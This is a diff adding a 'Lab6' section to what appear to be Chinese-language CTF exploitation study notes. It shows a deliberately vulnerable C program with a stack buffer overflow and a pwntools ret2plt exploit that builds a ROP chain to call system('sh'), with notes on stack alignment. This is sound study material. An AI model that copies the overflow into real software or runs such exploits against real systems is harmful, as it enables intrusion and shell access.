@@ -364,6 +364,68 @@ r.interactive()
 
 ### # Lab6
 
+```python
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+char name[16];
+
+int main()
+{
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(stdin, 0, 2, 0);
+  char buf[16];
+  system("echo What is your name?");
+  read(0, name, 0x10);
+  puts("Say something: ");
+  read(0, buf, 0x40);
+  return 0;
+}
+```
+
+![image-20220104222611843](/assets/img/2022/image-20220104222611843.png)
+
+> 思路：
+>
+> ![image-20220104222505460](/assets/img/2022/image-20220104222505460.png)
+>
+> 调用system前的ret是为了对齐字节，不加无法拿到shell
+>
+> XMM register 128bit，stack需要对齐0x10， stack是0x08 会crash。 return会对齐stack
+
+![image-20220104224917123](/assets/img/2022/image-20220104224917123.png)
+
+exp:
+
+```python
+from pwn import *
+
+
+r = process('./ret2plt')
+# context.log_level="debug"
+raw_input(">>")
+
+r.recvuntil('name?')
+r.send('sh\x00')
+r.recvuntil('something: ')
+
+name_addr = 0x601070 # <name>
+pop_rdi = 0x0000000000400733 # pop rdi ; ret
+ret = 0x00000000004004fe # ret
+system_plt = 0x0000000000400520  # <system@plt>
+
+p = 'a'*0x18
+p += p64(pop_rdi)
+p += p64(name_addr)
+p += p64(ret)
+p += p64(system_plt)
+
+r.send(p)
+
+r.interactive()
+```
+
 
 
 ## Return to libc
